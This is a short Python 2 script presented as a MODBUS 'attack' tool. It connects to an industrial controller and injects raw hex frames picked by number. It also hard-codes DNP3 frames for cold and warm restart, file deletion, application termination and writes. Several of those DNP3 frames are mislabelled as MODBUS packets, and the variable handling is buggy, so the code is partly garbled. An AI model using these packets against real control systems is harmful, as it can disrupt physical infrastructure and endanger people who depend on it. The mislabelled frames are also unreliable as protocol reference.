#!/usr/bin/python
# -*- coding: UTF-8 -*-
import getopt,sys,optparse
from socket import *
from binascii import hexlify, unhexlify

DEBUG = 1

dnp3_HealthCheck="\x05\x64\x05\xc0\x01\x00\x00\x04\xe9\x21" 
dnp3_HealthCheck="056405c001000004e921"
dnp3_WarmRestart="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x0e\x6c\xd1" 
dnp3_WarmRestart="056408c401000200390ddece0e6cd1" 
dnp3_ColdRestart="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x0d\x8E\x8B" 
dnp3_ColdRestart="056408c401000200390ddece0d8E8B" 
dnp3_Write="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x02\x9d\xf7" 
dnp3_Write="056408c401000200390ddece029df7" 
dnp3_InitData="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x0f\x32\xe7" 
dnp3_InitData="056408c401000200390ddece0f32e7" 
dnp3_AppTermination="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x12\xf6\x45" 
dnp3_AppTermination="056408c401000200390ddece12f645" 
dnp3_DeleteFile="\x05\x64\x08\xc4\x01\x00\x02\x00\x39\x0d\xde\xce\x1b\x21\x8c" 
dnp3_DeleteFile="056408c401000200390ddece1b218c" 
dnp3_ReadRequest="056405c903000400bd71"

dnp3_list=[
           "056405c001000004e921",  #dnp3_healthcheck
           "056408c40a000100fc42c0c00e7edc", #dnp3_WarmRestart
           "056408c40a000100fc42c0c00d9c86", #dnp3_ColdRestart
           "056412c403000400152dc1c10232010701fa7d0b460d01c863", #dnp3_Write
           "056408c401000200390ddece0f32e7", #dnp3_InitData
           "056408c401000200390ddece12f645", #dnp3_AppTermination
           "056408c401000200390ddece1b218c", #dnp3_DeleteFile
           "056405c903000400bd71"            #dnp3_ReadRequest
    ]

modbus_list=[
           "2af100000006ff020063001e",  #modbus read decrete input
           "05a000000006ff040001006305a100000006ff040029000205a200000006ff0408ab001605a300000006ff0408d20002", #modbus_Read Input Registers
           "056408c40a000100fc42c0c00d9c86", #modbus
           "056412c403000400152dc1c10232010701fa7d0b460d01c863", #modbus
           "056408c401000200390ddece0f32e7", #modbus
           "056408c401000200390ddece12f645", #modbus
           "056408c401000200390ddece1b218c", #modbus
           "056405c903000400bd71"            #modbus
    ]


HOST = "127.0.0.1"
PORT = 502
BUFSIZ = 1024


def usage():
    print(sys.argv[0])
    print(u"""
    -h / --help :help
    -i / --ip :ip address
    -p / --prot :destination port
    -t / --type: MODBUS PDU tye

    """)
    print_attack_type()


def print_attack_type():
    print(u"""
Defined MODBUS attack type:
'1: Read Decrete Inputs'
'2: Read Input Registers
    """)


def debug(msg):
    if DEBUG == 1:
        print ("debug: %s" % msg)


def send_modbus_packet(socket, modbus_type = 8):
 
    modbus_pdu = modbus_list[int(modbus_type) - 1]
    print  ("Sending MODBUS packet to target %s: %s"%(HOST, modbus_pdu))
    socket.sendall(unhexlify(modbus_pdu))

    #get response
    #if (8 == int(modbus_type)):
    resp = socket.recv(BUFSIZ)
    print("Received MODBUS Response from %s: %s" % (HOST, resp.encode('hex')))
 

def debug(msg):
    if DEBUG == 1:
        print ("debug: %s" % msg)

def main(argv):
    MODBUS_type = 8  #default to Request Link Status, if not specify MODBUS packet attack type [1..8]

    try:
        opts,args = getopt.getopt(sys.argv[1:],"hp:i:t:",["help","ip=","port=","type="])

    except getopt.GetoptError:
        usage()
        sys.exit(1)

    for opt, arg in opts:
          if opt in ('-h', "--help"):
             usage()
             sys.exit(1)
          elif opt in ("-i", "--ip"):
             HOST= arg
             print  ("target HOST IP: %s"% HOST)
          elif opt in ("-p", "--port"):
             PORT= arg
             print  ("Destination PORT: %s"% PORT)
          elif opt in ("-t", "--type"):
             try:
                 MODBUS_type= int(arg)
             except: 
                 print ("MODBUS type %s is NOT recogizable!" % arg)
                 sys.exit(1)
             if (MODBUS_type > len(modbus_list)):
                     print ("MODBUS type %s is out of range [1-%s]!" % (arg, len(modbus_list)))
                     sys.exit(1)
             print  ("MODBUS injected type: %s"% MODBUS_type)
           
                

    try:
        tcpCliSock = socket(AF_INET, SOCK_STREAM)
    except error, e:
        print  ("create socket failed %s" % e)
        sys.exit(1)
    try:
        tcpCliSock.connect((HOST, int(PORT)))
    except gaierror, e:
        print  ("HOST IP address error: %s" % e)
        sys.exit(1)
    except error, e:
        print  ("Connect to target %s: %s error: %s" % (HOST, PORT, e))
 
    send_modbus_packet(tcpCliSock, MODBUS_type)

    str1 = raw_input('> ')
    tcpCliSock.close()

if __name__ == "__main__":

    print_attack_type()

    if len(sys.argv) <= 1:  
         usage()
         sys.exit(1)

    main(sys.argv[1:])
